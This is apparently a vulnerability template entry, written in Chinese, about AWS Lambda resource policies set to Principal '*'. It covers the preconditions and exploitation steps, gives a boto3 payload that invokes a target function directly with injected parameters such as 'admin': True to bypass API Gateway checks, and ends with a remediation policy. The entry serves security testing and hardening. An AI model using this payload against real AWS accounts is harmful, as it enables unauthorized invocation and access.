---
id: LAMBDA-PRINCIPAL-STAR
title: Lambda 资源策略 Principal:* 未授权调用
product: aws-lambda
vendor: Amazon
severity: HIGH
tags: [authorization-bypass, lambda, aws, 无需认证, cross-account]
fingerprint: ["lambda", "aws", "InvokeFunction", "Principal"]
---

## 漏洞描述

Lambda 函数的 Resource-based Policy 中设置 `"Principal": "*"` 允许任何 AWS 身份（包括跨账户）直接调用该函数，完全绕过 API Gateway 的所有安全控制（请求验证、WAF、API Key、CORS）。

## 前置条件

- Lambda 资源策略包含 `"Principal": "*", "Action": "lambda:InvokeFunction"`
- 攻击者知道 Lambda 函数 ARN（Account ID + Function Name + Region）
- 攻击者拥有任意 AWS 账户凭据

## 利用步骤

1. 获取目标 Account ID（通过 S3 侧信道或错误信息泄露）
2. 获取 Lambda 函数名（通过 SNS 消息泄露、API Gateway 错误、猜测）
3. 使用攻击者 AWS 凭据直接 lambda:InvokeFunction
4. 请求不经过 API Gateway，可注入任意参数

## Payload

```python
import boto3, json

lambda_client = boto3.client('lambda', region_name='us-east-1')
response = lambda_client.invoke(
    FunctionName='arn:aws:lambda:us-east-1:TARGET_ACCT:function:FUNC_NAME',
    InvocationType='RequestResponse',
    Payload=json.dumps({
        "template": "/flag",       # API GW 会拦截的参数
        "token": "valid-token",
        "admin": True              # 任意注入
    })
)
print(json.loads(response['Payload'].read()))
```

## 验证方法

Lambda 函数被成功调用并返回结果，绕过了 API Gateway 的请求模型验证。

## 修复建议

限制 Principal 为 API Gateway 的执行角色：
```json
{
  "Principal": {"Service": "apigateway.amazonaws.com"},
  "Condition": {"ArnLike": {"aws:SourceArn": "arn:aws:execute-api:REGION:ACCOUNT:API_ID/*"}}
}
```
